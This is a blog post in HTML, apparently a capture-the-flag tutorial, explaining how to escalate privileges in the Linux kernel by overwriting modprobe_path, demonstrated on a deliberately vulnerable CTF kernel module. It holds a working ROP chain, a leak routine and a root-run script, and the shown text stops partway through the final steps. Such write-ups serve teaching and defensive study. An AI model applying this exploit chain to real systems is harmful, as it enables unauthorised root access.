@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Linux Kernel Exploitation Technique by overwriting modprobe_path - Midas Blog</title><meta name="Description" content="A popular and powerful technique to exploit the linux kernel"><meta property="og:title" content="Linux Kernel Exploitation Technique by overwriting modprobe_path" />
+<meta property="og:description" content="A popular and powerful technique to exploit the linux kernel" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/" />
+<meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/>
+<meta property="article:published_time" content="2021-02-23T20:20:10+07:00" />
+<meta property="article:modified_time" content="2021-02-23T20:20:10+07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
+
+<meta name="twitter:title" content="Linux Kernel Exploitation Technique by overwriting modprobe_path"/>
+<meta name="twitter:description" content="A popular and powerful technique to exploit the linux kernel"/>
+<meta name="application-name" content="Midas Blog">
+<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/" /><link rel="prev" href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Kernel Exploitation Technique by overwriting modprobe_path",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/lkmidas.github.io\/posts\/20210223-linux-kernel-pwn-modprobe\/"
+        },"genre": "posts","wordcount":  1758 ,
+        "url": "https:\/\/lkmidas.github.io\/posts\/20210223-linux-kernel-pwn-modprobe\/","datePublished": "2021-02-23T20:20:10+07:00","dateModified": "2021-02-23T20:20:10+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Midas"},"author": {
+                "@type": "Person",
+                "name": "Midas"
+            },"description": "A popular and powerful technique to exploit the linux kernel"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Linux Kernel Exploitation Technique by overwriting modprobe_path</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwning/"><i class="far fa-folder fa-fw"></i>pwning</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-23">2021-02-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1758 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#introducing-the-challenge">Introducing the challenge</a></li>
+    <li><a href="#the-overwriting-modprobe_path-technique">The overwriting modprobe_path technique</a></li>
+    <li><a href="#the-payload">The payload</a>
+      <ul>
+        <li><a href="#gathering-gadgets-and-addresses">Gathering gadgets and addresses</a></li>
+        <li><a href="#overwriting-modprobe_path">Overwriting modprobe_path</a></li>
+        <li><a href="#executing-arbitrary-script">Executing arbitrary script</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="preface">Preface</h2>
+<p>If you have taken a look at <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" target="_blank" rel="noopener noreffer">my series on learning linux kernel exploitation</a>, you probably have known that I have been learning the topic lately. For the previous several weeks, my team and I have participated in some CTFs, namely <code>DiceCTF</code> and <code>UnionCTF</code>, which both have a linux kernel pwn challenge. To my little knowledge and average brain power, I could not solve any of them, but through reading the writeups from other wonderful CTF teams and players, I have found out that a lot of them use a similar technique, in which the payload doesn&rsquo;t need to go through a painful process of making calls to <code>prepare_kernel_cred()</code> and <code>commit_creds()</code> at all. That technique is by overwriting the <code>modprobe_path</code> in the kernel. It is completely new to me, so I did some research on the Internet and experimented it out for myself. What I found is that this technique is quite popular and so easy to use, to a point that lots of pwners prefer to use it over all the traditional techniques.</p>
+<p>However, during my research, I didn&rsquo;t come across many posts or articles which explain the technique clearly, that&rsquo;s why I decided to write this post to clarify it a little bit. The technique itself is not complicated at all, I might also say that it is much simpler than the one that I demonstrated in me previous series. To demonstrate it in this post, I will be (ab)using <code>hxpCTF 2020</code> challenge <code>kernel-rop</code> again, simply because its simplicity is perfect for demonstration purpose.</p>
+<p>This post is gonna be on the shorter side, but I hope it can be useful for those who haven&rsquo;t known of this technique yet.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
+        </div>
+    </div>
+<h2 id="introducing-the-challenge">Introducing the challenge</h2>
+<p>Because I want this post to be a separate standalone post from my prevous series, I will re-explain the challenge <code>kernel-rop</code>. If you have already read the series, or experienced the challenge yourself, feel free to skip this part.</p>
+<p>In short, the challenge gives us the following files:</p>
+<ul>
+<li><a href="/posts/20210223-linux-kernel-pwn-modprobe/vmlinuz" rel="">vmlinuz</a> - the compressed Linux kernel.</li>
+<li><a href="/posts/20210223-linux-kernel-pwn-modprobe/initramfs.cpio.gz" rel="">initramfs.cpio.gz</a> - the Linux file system, the vulnearable kernel module call <code>hackme.ko</code> is included in here.</li>
+<li><a href="/posts/20210223-linux-kernel-pwn-modprobe/run.sh" rel="">run.sh</a> - the shell script that contains <code>qemu</code> run command.</li>
+</ul>
+<p>And these are the information that we can get from those files:</p>
+<ul>
+<li>The system has full protection: <code>SMEP</code>, <code>SMAP</code>, <code>KPTI</code> and <code>KASLR</code>.</li>
+<li>The linux kernel uses <a href="https://lwn.net/Articles/824307/" target="_blank" rel="noopener noreffer">FG-KASLR</a>, a non-mainstream version of <code>KASLR</code> which adds an extra layer of protection by randomizing each functions' addresses, instead of just the kernel base.</li>
+<li>The vulnearable module registers a device named <code>hackme</code> in <code>hackme_init()</code>, which we can open and perform read/write operations on it.</li>
+<li>The <code>hackme_read()</code> and <code>hackme_write()</code> functions have a stack buffer overflow vulnerability, which allows us to read and write almost infinitely on the kernel stack:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span>   
+    <span class="c1">//...
+</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="c1">//...
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+        <span class="n">BUG</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
+    <span class="c1">//...
+</span><span class="c1"></span><span class="p">}</span>
+
+<span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span>   
+    <span class="c1">//...
+</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="c1">//...
+</span><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
+        <span class="n">BUG</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="c1">//...
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></div><p>That&rsquo;s it for the challenge and its environment, super simple and standard. Now let&rsquo;s get into the most important part, which is explaining the technique itself.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>In the <a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" target="_blank" rel="noopener noreffer">final part</a> of my previous series, I have demonstrated an exploit that is used by the author, using a 4-stage payload to call <code>commit_creds(prepare_kernel_cred(0))</code>. If you are interested, you can check it out.</em></div>
+        </div>
+    </div>
+<h2 id="the-overwriting-modprobe_path-technique">The overwriting modprobe_path technique</h2>
+<p>First of all, what is <code>modprobe</code>? According to wikipedia: &ldquo;<em><code>modprobe</code> is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernel</em>&rdquo;. Effectively, this is a program that will be executed when we install or uninstall a new module into the linux kernel. The path to it is a kernel global variable, which is default to be <code>/sbin/modprobe</code>, we can check it ourselves by running the following command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/sys/kernel/modprobe
+-&gt; /sbin/modprobe
+</code></pre></div><p>As of now, you might be wondering why and how this program is going to be useful for kernel exploitation. Let me tell you the two things that make it so exploitable:</p>
+<p>Firstly, the path to <code>modprobe</code>, which is <code>/sbin/modprobe</code> by default, is stored under the symbol <code>modprobe_path</code> in the kernel itself, and also in a writable page. We can get its address by reading <code>/proc/kallsyms</code> (the address will be different for you since there is <code>KASLR</code>):</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep modprobe_path
+-&gt; ffffffffa7a61820 D modprobe_path
+</code></pre></div><p>Secondly, the program, whose path is stored in <code>modprobe_path</code>, will be executed when we execute a file with an unknown file type. More precisely, if we call <code>execve()</code> on a file whose <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener noreffer">file signature</a> (aka magic header) is unknown by the system, it will then make the following calls, which in the end invokes <code>modprobe</code>:</p>
+<ol>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1977" target="_blank" rel="noopener noreffer">do_execve()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1855" target="_blank" rel="noopener noreffer">do_execveat_common()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1788" target="_blank" rel="noopener noreffer">bprm_execve()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1740" target="_blank" rel="noopener noreffer">exec_binprm()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1694" target="_blank" rel="noopener noreffer">search_binary_handler()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L124" target="_blank" rel="noopener noreffer">request_module()</a></li>
+<li><a href="https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L69" target="_blank" rel="noopener noreffer">call_modprobe()</a></li>
+</ol>
+<p>All of those calls will do this in the end:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="k">static</span> <span class="kt">int</span> <span class="nf">call_modprobe</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">module_name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wait</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-q&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;--&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">module_name</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  	<span class="n">info</span> <span class="o">=</span> <span class="n">call_usermodehelper_setup</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+					 <span class="nb">NULL</span><span class="p">,</span> <span class="n">free_modprobe_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div><p>In short, whatever file whose path is currently stored in <code>modprobe_path</code> will be executed when we issue the system to execute a file with an unknown file type. Therefore, the plan of this technique is to use an arbitrary write primitive to overwrite <code>modprobe_path</code> into a path to a shell script that we have written ourselves, then we execute a dummy file with an unknown file signature. The result is that the shell script will be executed when the system is still in kernel mode, leading to an <em><strong>arbitrary code execution with root privileges</strong></em>.</p>
+<p>To see the technique in action, let&rsquo;s write a payload for <code>kernel-rop</code>.</p>
+<h2 id="the-payload">The payload</h2>
+<h3 id="gathering-gadgets-and-addresses">Gathering gadgets and addresses</h3>
+<p>The prerequisites for the technique is as follow:</p>
+<ol>
+<li>knowing the address of <code>modprobe_path</code>.</li>
+<li>knowing the address of <code>kpti_trampoline</code> in order to cleanly return to userland after overwriting <code>modprobe_path</code>.</li>
+<li>having an arbitrary write primitive.</li>
+</ol>
+<p>In the case of a stack buffer overflow that we have in this challenge, those 3 prerequisites are actually in fact converge to just one, which is knowing the kernel image base, here&rsquo;s why:</p>
+<ul>
+<li>Interestingly, both <code>modprobe_path</code> and <code>kpti_trampoline</code> are unaffected by <code>FG-KASLR</code>, so their addresses are a constant offset from the kernel image base.</li>
+<li>For the arbitrary write, we can use these 3 gadgets, which reside in the area at the start of the kernel, which is unaffected by <code>FG-KASLR</code>:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4d11UL</span><span class="p">;</span> <span class="c1">// pop rax; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rbx_r12_rbp_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x3190UL</span><span class="p">;</span> <span class="c1">// pop rbx ; pop r12 ; pop rbp ; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">write_ptr_rbx_rax_pop2_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x306dUL</span><span class="p">;</span> <span class="c1">// mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
+</span></code></pre></div><p>We leak the kernel image base and calculate those addresses by using the <code>hackme_read()</code> operation:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">image_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">38</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xa157ULL</span><span class="p">;</span>
+    <span class="n">kpti_trampoline</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x200f10UL</span> <span class="o">+</span> <span class="mi">22UL</span><span class="p">;</span>
+    <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4d11UL</span><span class="p">;</span>
+    <span class="n">pop_rbx_r12_rbp_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x3190UL</span><span class="p">;</span>
+    <span class="n">write_ptr_rbx_rax_pop2_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x306dUL</span><span class="p">;</span>
+    <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x1061820UL</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Image base: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">image_base</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><h3 id="overwriting-modprobe_path">Overwriting modprobe_path</h3>
+<p>After leaking, the goal now is to overwrite <code>modprobe_path</code> into a path to a file that we can control. In most linux system, we can freely read and write into the <code>/tmp</code> directory as any user, therefore, I will overwrite <code>modprobe_path</code> into a file called <code>/tmp/x</code> by using the 3 gadgets mentioned above, then safely return to the function <code>get_flag()</code> in userland after going through the <code>kpti_trampoline</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x782f706d742f</span><span class="p">;</span> <span class="c1">// rax &lt;- &#34;/tmp/x&#34;
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rbx_r12_rbp_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span> <span class="c1">// rbx &lt;- modprobe_path
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">write_ptr_rbx_rax_pop2_ret</span><span class="p">;</span> <span class="c1">// modprobe_path &lt;- &#34;/tmp/x&#34;
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_flag</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to overwrite modprobe_path&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><h3 id="executing-arbitrary-script">Executing arbitrary script</h3>
+<p>Now that <code>modprobe_path</code> is pointing to <code>/tmp/x</code>, what we would want to do is to write its content, which will be executed with root privileges. In this case, I will just write a simple shell script that copy the flag from <code>/dev/sda</code> into the <code>/tmp</code> directory and make it readable by all users. This is the script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
+</span><span class="cp"></span>cp /dev/sda /tmp/flag
+chmod <span class="m">777</span> /tmp/flag
+</code></pre></div><p>After that, I write a dummy file which contains only <code>\xff</code> bytes, in order to make it an unknown file to the system, and then execute it. After it is finished executing, we should have the flag file in <code>/tmp</code> that can be read:</p>
